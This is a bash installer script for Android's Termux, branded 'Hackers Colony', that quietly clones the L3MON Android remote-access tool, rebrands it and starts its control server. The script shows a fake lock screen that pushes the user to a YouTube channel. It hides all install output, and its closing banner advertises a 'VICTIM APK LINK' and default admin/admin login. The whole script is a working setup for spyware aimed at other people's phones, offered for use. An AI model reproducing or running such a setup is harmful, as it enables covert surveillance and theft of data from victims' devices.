#!/bin/bash

# Screen clear for elite look
clear

# 1. Elite ASCII ART (Green)
echo -e "\e[1;32m"
echo "  _    _  _____  ____              _   _ _____  _____   ____  "
echo " | |  | |/ ____|/ __ \      /\    | \ | |  __ \|  __ \ / __ \ "
echo " | |__| | |    | |  | |    /  \   |  \| | |  | | |__) | |  | |"
echo " |  __  | |    | |  | |   / /\ \  | . \` | |  | |  _  /| |  | |"
echo " | |  | | |____| |__| |  / ____ \ | |\  | |__| | | \ \| |__| |"
echo " |_|  |_|\_____|\____/  /_/    \_\_| \_|_____/|_|  \_\\____/ "
echo -e "\e[0m"

echo -e "\e[1;33m      WELCOME TO HACKERS COLONY - ANDROID SERVER \e[0m"
echo -e "\e[1;36m             Created by: Azhar (HCO Team) \e[0m"
echo -e "\e[1;32m──────────────────────────────────────────────────────────\e[0m"

# 2. Lock System with Countdown
echo -e "\e[1;31m  [!] ACCESS DENIED: TOOL IS LOCKED! \e[0m"
echo -e "\e[1;37m  Subscribe to our YouTube to unlock the tool.\e[0m"
echo -e "\e[1;37m  Opening YouTube in...\e[0m"

for i in {10..1}
do
    echo -ne "\e[1;32m  >>> $i <<<\r"
    sleep 1
done

# Auto-Open YouTube
termux-open-url https://youtube.com/@hackers_colony_tech
sleep 2

echo -e "\n\e[1;32m──────────────────────────────────────────────────────────\e[0m"
echo -ne "\e[1;33m  [?] Press ENTER to verify and start installation: \e[0m"
read verify

# 3. Silent Installation (No Messy Messages)
echo -e "\n\e[1;34m[*] Building HCO-ANDRO Private Server (Elite Edition)...\e[0m"

# Updating & Installing (Output Hidden)
apt update && apt upgrade -y > /dev/null 2>&1
pkg install nodejs git python openjdk-17 wget -y > /dev/null 2>&1
npm install pm2 -g > /dev/null 2>&1

# ENGINE SETUP (Public link use kar raha hoon taaki login na maange)
git clone https://github.com/D3VL/L3MON.git .hco_core > /dev/null 2>&1
mv .hco_core/* .
rm -rf .hco_core

# Custom Branding
grep -rl "L3MON" . | xargs sed -i 's/L3MON/HCO-ANDRO-SERVER/g' > /dev/null 2>&1

# Server modules
cd server
npm install > /dev/null 2>&1
pm2 start index.js --name "hco-server" > /dev/null 2>&1

# 4. Final Professional Result (No WhatsApp/YouTube Display here)
clear
echo -e "\e[1;32m"
echo "──────────────────────────────────────────────────────────"
echo "         🔥 WELCOME TO HACKERS COLONY SERVER 🔥          "
echo "──────────────────────────────────────────────────────────"
echo -e "\e[0m"
echo -e "\e[1;36m  🛠️  DEVELOPER      : \e[1;37mAzhar (HCO Team)\e[0m"
echo -e "\e[1;36m  🌐 DASHBOARD URL   : \e[1;37mhttp://localhost:22533\e[0m"
echo -e "\e[1;36m  📲 VICTIM APK LINK : \e[1;37mCheck Dashboard Build Section\e[0m"
echo -e "\e[1;32m──────────────────────────────────────────────────────────\e[0m"
echo -e "\e[1;33m  🔑 Login User: admin  |  🔑 Pass: admin\e[0m"
echo -e "\e[1;32m──────────────────────────────────────────────────────────\e[0m"
